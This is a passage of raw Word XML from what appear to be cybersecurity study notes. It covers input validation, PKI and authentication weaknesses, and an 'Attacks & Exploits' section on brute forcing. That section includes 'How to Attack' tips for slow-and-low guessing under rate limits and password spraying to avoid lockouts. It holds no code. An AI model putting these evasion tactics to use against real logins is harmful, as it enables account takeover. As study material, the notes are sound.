        <w:t>Apply length limits to prevent overflows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55940750" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Escape/encode input before sending to database, file, or browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE95EC2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use parameterized queries / prepared statements for SQL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E4F205" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use input validation libraries (OWASP ESAPI, built-in framework validators).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2596D6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Log and monitor rejected inputs for attack detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C187498" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="79" w:name="_Toc208408550"/>
      <w:r>
        <w:t>Part III – Authentication &amp; Access Control</w:t>
      </w:r>
      <w:bookmarkEnd w:id="79"/>
    </w:p>
    <w:p w14:paraId="513DD7CA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Authentication Extensions (rarely implemented).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8C41DD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use Static IPs for critical devices (servers, firewalls).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC7A130" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="80" w:name="_Toc208408551"/>
      <w:r>
        <w:t>Public Key Infrastructure (PKI)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="80"/>
    </w:p>
    <w:p w14:paraId="1302C39A" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Framework that manages digital certificates &amp; public-key cryptography.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C16B605" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="81" w:name="_Toc208408552"/>
      <w:r w:rsidRPr="00E270C8">
        <w:t>PKI Ensures</w:t>
      </w:r>
      <w:bookmarkEnd w:id="81"/>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E51DE2B" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Authentication → Proving who you are</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C4F74D" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Confidentiality → Encryption of data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50504373" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Integrity → Data not altered in transit</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323883FF" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Non-Repudiation → Proof that senders cannot deny action</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2C92B9" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="82" w:name="_Toc208408553"/>
      <w:r w:rsidRPr="00E270C8">
        <w:lastRenderedPageBreak/>
        <w:t>Core Components of PKI</w:t>
      </w:r>
      <w:bookmarkEnd w:id="82"/>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720588D0" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Digital Certificates (X.509): Electronic documents that bind a public key to an entity (person, org, website). Issued by a trusted CA.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595E89F3" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Certificate Authorities (CA): Entities that issue and sign certificates. Chain of Trust: Root CA → Intermediate CA → End-entity CA.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADF08D2" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Registration Authority (RA): Verifies user identity before certificate issuance.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79621616" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Certificate Revocation List (CRL): List of invalid/revoked certificates.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F633DE" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Online Certificate Status Protocol (OCSP): Real-time check of certificate validity.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A309872" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Key Pairs</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35555496" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Public Key → Shared openly (in certificates)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259ACC0B" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Private Key → Kept secret (used for signing/decryption)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E929BC3" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="83" w:name="_Toc208408554"/>
      <w:r w:rsidRPr="00E270C8">
        <w:t>How Certificates Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="83"/>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196E528C" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Step 1: Browser requests the site's digital certificate (HTTPS).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38617C02" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Step 2: Server sends X.509 certificate with domain name, public key, CA signature.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDF2695" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Step 3: Browser verifies certificate against trusted CA list.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D7CB0B" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Step 4: Browser generates session key (symmetric AES), encrypts with server’s public key. Only server (with private key) can decrypt.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E951F36" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="84" w:name="_Toc208408555"/>
      <w:r w:rsidRPr="00E270C8">
        <w:t>PKI Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="84"/>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69DB5FFD" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Man-in-the-Middle: SSL stripping, fake/self-signed certificates</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFE530A" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Compromised CA</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC47036" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Expired Certificates</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D11AFB1" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Weak Algorithms (MD5/SHA1 collisions)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8DFEAF" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Improper Validation (apps not validating CN)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047029D6" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Private Key Theft</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E01BB4D" w14:textId="77777777" w:rsidR="00E270C8" w:rsidRPr="00E270C8" w:rsidRDefault="00E270C8" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E270C8">
        <w:t>Certificate Pinning Bypass</w:t>
      </w:r>
      <w:r w:rsidRPr="00E270C8">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F29605" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="85" w:name="_Toc208408556"/>
      <w:r>
        <w:t>Authentication Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="85"/>
    </w:p>
    <w:p w14:paraId="1A721FFA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Weak/Default Passwords (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>admin:admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27416B5A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password Reuse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C011A6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Brute Force / Credential Stuffing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A71B863" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Phishing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BB98D1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Man-in-the-Middle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E23E27" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7728CB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Biometric Spoofing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0D2A1C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="86" w:name="_Toc208408557"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Part IV – Attacks &amp; Exploits</w:t>
      </w:r>
      <w:bookmarkEnd w:id="86"/>
    </w:p>
    <w:p w14:paraId="2015677D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="_Toc208408558"/>
      <w:r>
        <w:t>Brute Forcing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="87"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702FEEDD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>→ Trying many credential or secret guesses until one works.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EB86EC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="88" w:name="_Toc208408559"/>
      <w:r>
        <w:t>Variants</w:t>
      </w:r>
      <w:bookmarkEnd w:id="88"/>
    </w:p>
    <w:p w14:paraId="5BA408A3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Online Login Guessing → Rapid/focused guesses against a live login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEC4DA0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password Spraying → One (or a few) very common passwords across many users to dodge lockout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6AC8FF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Credential Stuffing → Reusing username/password pairs leaked elsewhere against your site/app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DAD9842" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2nd-factor Attacks (indirect): ‘MFA Fatigue’ (push bombing)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B6E99A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>True TOTP brute-force is impractical within 30-sec window if rate limited</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2C99AD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Offline Cracking: Attacking hashes (from a dump) using CPU/GPU/FPGA with dictionaries, rules, masks, hybrid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D106ECA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Key/secret brute-force: Short JWT secrets, insecure API keys, 4–6 digit PINs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9AB3AB" w14:textId="77777777" w:rsidR="008845E1" w:rsidRPr="008845E1" w:rsidRDefault="008845E1" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="89" w:name="_Toc208408560"/>
      <w:r>
        <w:t>How to Attack</w:t>
      </w:r>
      <w:bookmarkEnd w:id="89"/>
    </w:p>
    <w:p w14:paraId="6FEB89F3" w14:textId="77777777" w:rsidR="008845E1" w:rsidRDefault="008845E1" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Slow &amp; Low Attacks → Instead of thousands of requests per second, send a few per minute to stay below rate-limit threshold.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A181F85" w14:textId="77777777" w:rsidR="008845E1" w:rsidRDefault="008845E1" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password Spraying → One common password across many accounts to avoid lockouts.</w:t>
      </w:r>
    </w:p>
